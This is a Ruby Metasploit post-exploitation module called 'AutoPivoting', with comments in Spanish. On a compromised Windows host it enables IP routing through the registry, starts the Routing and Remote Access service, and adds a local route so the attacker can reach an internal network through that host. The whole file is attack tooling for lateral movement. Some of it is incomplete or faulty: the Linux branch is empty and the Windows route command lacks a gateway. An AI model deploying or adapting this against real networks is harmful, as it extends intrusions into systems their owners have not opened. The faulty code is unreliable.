##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows'

class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'AutoPivoting',
        'Description'   => %q{This module Configures the computer to be a gateway torward other network. It works with linux and windows systems.},
        'License'       => MSF_LICENSE,
        'Author'        => 
           [
             'Mikel & j4r3',
             'none <none[at]gmail.com>'
           ],
		'Platform'      => [ 'win', 'linux'],
        'SessionTypes'  => [ 'meterpreter','shell']
      ))

    register_options(
      [
		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
		OptAddressRange.new('NET',    [true, 'The network we want to arrive (Example: 10.0.0.0/24)']),
		OptAddress.new('RHOST',    [true, 'IP address of pivot computer (our side IP)']),
		OptString.new('NInt01', [true, 'Name of pivot network adapter of our network']),
		OptString.new('NInt02', [true, 'Name of pivot network adapter of the other network']),
      ])
  end
	#Obtenemos el OS de instalacion de metasploit
	def sistema_base?
		if (Msf::Config.local_directory[0,1])==("/")
			return "linux"
		elsif ((Msf::Config.local_directory[0,1])=~ /[[:alpha:]]/)
			return "windows"
		else
			#usamos uknown por el tipo de sistemas compatibles en el framwork
			return "unknown" 
		end
	end

	def linux_pivot()
		#
		# Linux commands
		#

	end
	
	def getStatus(status)
		#
		# Get Status in dtring format
		#
		
		case status.to_s
		when '1'
			return 'Stoped'
		when '4'
			return 'Started'
		when '7'
			return 'Disabled'
		end
		return "Unknown status: #{status.to_s}"
	end
	
	def windows_pivot()
		#
		# Windows commands
		#
		if is_admin? or is_system?
		
			rra_info = service_info("RemoteAccess")
			rra_status = getStatus(rra_info[:status])
			key = "HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\"
			iprouting_status = registry_getvalinfo(key,"IPEnableRouter")["Data"]
			print_status("Initial values:")
			print_status("	Service RemoteAccess status: #{rra_status}")
			print_status("	IPEnableRouter value: #{iprouting_status}")
			puts("")
			print_status("Starting the proccess...")
			print_status("	Enabling IP Router...")
			
			if rra_status != 'Started'
				if registry_setvaldata(key, "IPEnableRouter", "1", "REG_DWORD")
					print_good("	IP Routing is Enabled.")
				else
					print_bad("  	There was an error set the IPEnableRouter value.")
					# Exit.
				end
			else
				print_good("	IP Routing is Enabled.")
			end
			
			# Esto es para Windows Servers y XP
			# print_status(cmd_exec("netsh routing ip nat install"))
			# print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt02']}\" full"))
			# print_status(cmd_exec("netsh routing ip nat add interface \"#{datastore['NInt01']}\" private"))
			
			# Para Windows Vista, 7, 8, 8.1 y 10 se hace compartiendo conexión de red en las propiedades del adaptador.
			# De igual manera se hace con los TAP (VPN)
			
			
			print_status("	Enabling Routing and Remote Access service...")
			if service_change_startup("RemoteAccess",2)
				print_good("	RemoteAccess service enabled.")
			else
				print_bad("  	There was an error enabling RemoteAccess service.")
				# Exit
			end
			print_status("	Starting Routing and Remote Access service...")
			if service_start("RemoteAccess")
				print_good("	RemoteAccess service started.")
			else
				print_bad("  	There was an error starting RemoteAccess service.")
				# Exit
			end
			
			puts("")
		else
			print_bad("You have to be administrator in the pivot machine to execute this module.")
		end
	end
	#
  	# acciones segun eleccion plataforma
  	#
	def set_pivot()
		case session.platform
	  	when 'linux'
		  	# codigo para linux
		  	linux_pivot()
		when 'windows'
		  	# codigo para windows
			windows_pivot()
		end
	end
	
	#conversion cidr a netmask
	def get_netmask(eval_net)
		cidr= eval_net.split("/").last
		return IPAddr.new('255.255.255.255').mask(cidr).to_s
	end
	#check de rnet si cumple formato ip/cidr debe de ser comprobado por OptAddressRange
	def check_rnet()
		if get_cidr(datastore['NET']) == false
			print_bad("cidr en blanco")
			return false
		elsif not((0..33).include?(get_cidr(datastore['NET'])))
			print_bad("cidr fuera de rango")
			return false
		elsif not(Rex::Socket.is_ipv4?(get_net(datastore['NET'])))
			print_bad("no es ipv4")
			return false
		else
			return true
		end
	end
	#funcion obtener red
	def get_net(eval_net)
		return eval_net.split("/").first
	end
	#funcion obtener cidr devuelve un integer con el cidr especificado y si no esta devuelve false
	def get_cidr(eval_net)
		if eval_net.include? "/"
			return eval_net.split("/").last.to_i
		else
			return false
		end
	end
	
	# Crea la ruta en la máquina local
	# Obtenemos sistema local:
	def create_route()
		print_status("Adding route to target network...")
		case sistema_base?
	  	when 'linux'
		  	if system("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
				print_good("Route added.")
			else
				print_bad("Something was wrong adding local route. Try to add it manually.")
			end
		when 'windows'
		  	# codigo para windows conversion con variables de cidr a netmask y extraccion de red
			if system("route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
				print_good("Route added.")
			else
				print_bad("Something was wrong adding local route. Try to add it manually")
			end
		end
	end
	
	#
  	# funcion principal, donde se invocan los comandos necesarios segun la plataforma
  	#
	def run
		
		if check_rnet()

			# print_status("OS: #{session.sys.config.sysinfo['OS']}")
			# print_status("Computer name: #{'Computer'} ")
			# print_status("Current user: #{session.sys.config.getuid}")
			set_pivot()
			create_route()
			# para saber si las rutas son correctas
			# print_status("windows: route -p add #{get_net(datastore['NET'])} mask #{get_netmask(datastore['NET'])} METRIC 1")
			# print_status("linux: route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
		else
			print_bad("Aborting Module.")
		end
			
  	end
end
